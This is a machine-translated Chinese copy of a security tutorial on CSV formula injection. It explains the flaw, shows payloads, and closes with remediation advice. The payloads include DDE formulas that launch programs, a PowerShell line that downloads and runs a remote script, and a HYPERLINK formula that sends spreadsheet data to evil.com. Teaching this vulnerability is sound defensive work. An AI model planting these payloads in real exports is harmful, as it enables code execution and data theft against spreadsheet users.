<html>
<head>
<title>Formula Injection | Exploiting CSV functionality</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">配方注射|利用CSV功能</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/formula-injection-exploiting-csv-functionality-cd3d8efd02ec?source=collection_archive---------0-----------------------#2021-05-11">https://infosecwriteups.com/formula-injection-exploiting-csv-functionality-cd3d8efd02ec?source=collection_archive---------0-----------------------#2021-05-11</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="c15b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">配方注射入门。如何利用Excel进行开发？</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/3089c65673cff2e03f3a80b679610c1d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Z42L39iHgrZlYa7-pu16hg.jpeg"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">照片由<a class="ae lb" href="http://twitter.com/hacktevo" rel="noopener ugc nofollow" target="_blank"> Hacktevo </a>拍摄</figcaption></figure><p id="76ce" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">许多现代web应用程序和框架都提供电子表格导出功能，允许用户下载. csv或。xls文件，适合在Microsoft Excel和OpenOffice Calc等电子表格应用程序中处理。生成的电子表格的单元格通常包含来自不可信来源的输入，如调查响应、交易详细信息和用户提供的地址。</p><p id="45dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当网站在CSV文件中嵌入不受信任的输入时，公式注入或CSV公式注入漏洞会影响应用程序。它会影响访问应用程序导出的电子表格文件的应用程序最终用户。当使用Microsoft Excel或LibreOffice Calc等电子表格程序打开CSV时，任何以=开头的单元格都将被软件解释为公式。</p><h2 id="ca27" class="lc ld iq bd le lf lg dn lh li lj dp lk jy ll lm ln kc lo lp lq kg lr ls lt lu bi translated">影响</h2><p id="7169" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">1.通过利用电子表格软件(如CVE-2014–3524)中的漏洞，或者通过利用用户忽略他们从自己的网站下载的电子表格中的安全警告的倾向，来劫持用户的计算机。<br/> 2。从电子表格或其他打开的电子表格中过滤内容。</p><p id="4355" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">恶意公式在输入参数中提供，希望它们被不充分地验证到导出到合法应用程序用户的电子表格中。例如，在销售订单的发货地址可导出到。xlsx电子表格，或者在另一个例子中，调查者可导出的调查答案。</p><h2 id="7b69" class="lc ld iq bd le lf lg dn lh li lj dp lk jy ll lm ln kc lo lp lq kg lr ls lt lu bi translated"><strong class="ak">开发配方注射</strong></h2><p id="38c0" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">开发配方注射可能相对简单。这里，我们使用一个<a class="ae lb" href="https://www.techopedia.com/definition/4973/dynamic-data-exchange-dde#:~:text=Dynamic%20Data%20Exchange%20(DDE)%20is,protocols%20for%20communication%20and%20sharing." rel="noopener ugc nofollow" target="_blank">动态数据交换</a>公式在MS Excel Windows受害者上执行Calculator作为示例负载。<br/>作为攻击者，首先使用:</p><pre class="km kn ko kp gt ma mb mc md aw me bi"><span id="92a8" class="lc ld iq mb b gy mf mg l mh mi">=cmd|’/C calc.exe’!Z0</span></pre><p id="060b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">作为电子商务应用程序中的名字或地址行1，然后购买任意商品。完成结账程序。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi mj"><img src="../Images/a1ead06f27d4340a6d8c6aa4190672b1.png" data-original-src="https://miro.medium.com/v2/resize:fit:870/format:webp/0*-ilQlccNLIUXXnu-.png"/></div></figure><p id="28ef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，作为受害者，使用应用程序的文件导出功能(包括名字，比如在送货地址中，供卖方参考)。在Microsoft Excel中打开它，会提示以下安全警告:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mk"><img src="../Images/652c782d82288d57711dc82488c9883d.png" data-original-src="https://miro.medium.com/v2/resize:fit:766/format:webp/0*VQ9_2ETVQ6MOGKn9.png"/></div></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ml"><img src="../Images/279841249fe3b5925e3fe2117f6e9115.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*n-e8Jhrq0JLMoeMu.png"/></div></div></figure><p id="c56a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果警告被点击通过(稍后将详细介绍)，我们就有了命令注入。然后可以通过多种方法提升到远程代码执行。一个例子是使用PowerShell下载并执行恶意代码，而不一定向反病毒软件发出警报。</p><pre class="km kn ko kp gt ma mb mc md aw me bi"><span id="d485" class="lc ld iq mb b gy mf mg l mh mi">=cmd|’/Cpowershell Import-Module BitsTransfer; Start-BitsTransfer -<br/>source https://141.io/shell.ps; Invoke-Item shell.ps;’!z</span></pre><p id="b24a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，可以修改有效载荷本身，使其在没有数字和空格的情况下工作。这方面的一个例子是:</p><pre class="km kn ko kp gt ma mb mc md aw me bi"><span id="1619" class="lc ld iq mb b gy mf mg l mh mi">=cmd|’/Ccalc.exe’!z</span></pre><p id="f964" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">事实上，如果不需要传递参数，甚至可以这样做:</p><pre class="km kn ko kp gt ma mb mc md aw me bi"><span id="be86" class="lc ld iq mb b gy mf mg l mh mi">=calc|a!z </span></pre><p id="2091" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这在某些情况下对于本地特权提升或者作为概念的最小证明是有用的。</p><p id="a82e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，除了使用code exec之外，还可能使用其他公式，如HYPERLINK，从文档中提取机密信息。这个向量很有趣，因为当文件被访问时，甚至当超链接被点击时，都不会提示任何警告。让我们描绘一张包含共同基金经纪人统计数据的电子表格。它保存了他们的客户名单，他们的投资金额，他们的帐户信息和其他类似投资组合的名称。<br/>如果任何一位客户，比如Eve，将其姓名或投资组合名称更改为:</p><pre class="km kn ko kp gt ma mb mc md aw me bi"><span id="280c" class="lc ld iq mb b gy mf mg l mh mi">=HYPERLINK(“http://evil.com?x="&amp;A3&amp;","&amp;B3&amp;"[CR]","Error fetching info: Click me to resolve.”)</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi mm"><img src="../Images/854dd3350d5d526cc3257147b03cb15a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1142/format:webp/0*wSqmKm508jb8tfZY.png"/></div></figure><p id="abac" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用特制的有效负载，任何点击超链接的受害者都可以将文档的所有数据发送到远程站点。</p><blockquote class="mn mo mp"><p id="79bf" class="jn jo mq jp b jq jr js jt ju jv jw jx mr jz ka kb ms kd ke kf mt kh ki kj kk ij bi translated">为了让这个例子工作，需要<strong class="jp ir">启用以下配置</strong>:文件→选项→信任中心→信任中心设置→外部内容→启用动态数据交换服务器启动或使用<strong class="jp ir">旧Excel版本</strong>。</p></blockquote><h2 id="e996" class="lc ld iq bd le lf lg dn lh li lj dp lk jy ll lm ln kc lo lp lq kg lr ls lt lu bi translated">显示针对Piwik的CSV注射的视频:</h2><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="mu mv l"/></div></figure><h1 id="34c6" class="mw ld iq bd le mx my mz lh na nb nc lk nd ne nf ln ng nh ni lq nj nk nl lt nm bi translated">补救</h1><p id="944b" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">电子表格软件可以采取措施来减轻这些攻击，但防止公式注入最终是每个生成包含用户提供的内容的电子表格的应用程序的责任。目前，我们所知道的最好的防御策略是在以“=”、“+”或“-”开头的单元格前加上撇号。这将确保单元格不会被解释为公式，并且在Microsoft Excel中撇号本身不会显示。</p><p id="3b56" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">另一个教训是。csv和。tsv文件不应被视为等同于。txt文件，因为在其中嵌入活动内容很简单。</p><p id="d01e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，确保您运行的是Apache open office 4 . 1 . 1版或更高版本，以及libre office 4 . 2 . 5版或更高版本。</p></div><div class="ab cl nn no hu np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="ij ik il im in"><h2 id="011f" class="lc ld iq bd le lf lg dn lh li lj dp lk jy ll lm ln kc lo lp lq kg lr ls lt lu bi translated">而这就是配方注射或csv注射！您还想了解其他哪些安全概念？我们很想知道。欢迎在Twitter <a class="ae lb" href="http://twitter.com/hacktevo" rel="noopener ugc nofollow" target="_blank"> @hacktevo上联系。</a></h2></div></div>    
</body>
</html>